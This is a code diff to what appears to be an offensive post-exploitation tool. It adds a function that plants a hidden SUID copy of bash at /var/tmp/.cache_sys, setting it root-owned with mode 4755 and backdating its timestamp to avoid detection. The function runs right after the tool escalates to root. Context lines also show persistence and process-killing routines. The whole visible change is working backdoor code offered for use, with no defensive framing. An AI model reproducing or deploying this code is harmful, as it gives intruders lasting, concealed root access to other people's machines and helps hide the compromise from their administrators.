@@ -244,6 +244,30 @@ WantedBy=timers.target
     except Exception as e:
         print(f"Persistence setup failed: {e}")
         return False
+
+def install_suid_backdoor():
+
+    # Verify the process has root privileges
+    if os.geteuid() != 0:
+        print("[-] Must be root to install SUID backdoor.")
+        return False
+
+    hidden_bash = "/var/tmp/.cache_sys"
+    print(f"[*] Installing SUID backdoor at {hidden_bash}...")
+    
+    try:
+        setup_cmds = f"""
+        cp /bin/bash {hidden_bash}
+        chown root:root {hidden_bash}
+        chmod 4755 {hidden_bash}
+        touch -r /bin/bash {hidden_bash}
+        """
+        subprocess.run(setup_cmds, shell=True, check=True)
+        print(f"[+] SUID backdoor successfully installed at {hidden_bash}")
+        return True
+    except Exception as e:
+        print(f"[-] Failed to install SUID backdoor: {e}")
+        return False
  
 def kill_others():
     """
@@ -414,6 +438,8 @@ def main():
             os.setresuid(0, 0, 0)
             os.setresgid(0, 0, 0)
             print(f"[+] After setuid: UID={os.getuid()}, EUID={os.geteuid()}")
+            install_suid_backdoor()
+
         except Exception as e:
             print(f"[-] setuid FAILED: {e}")
             import traceback
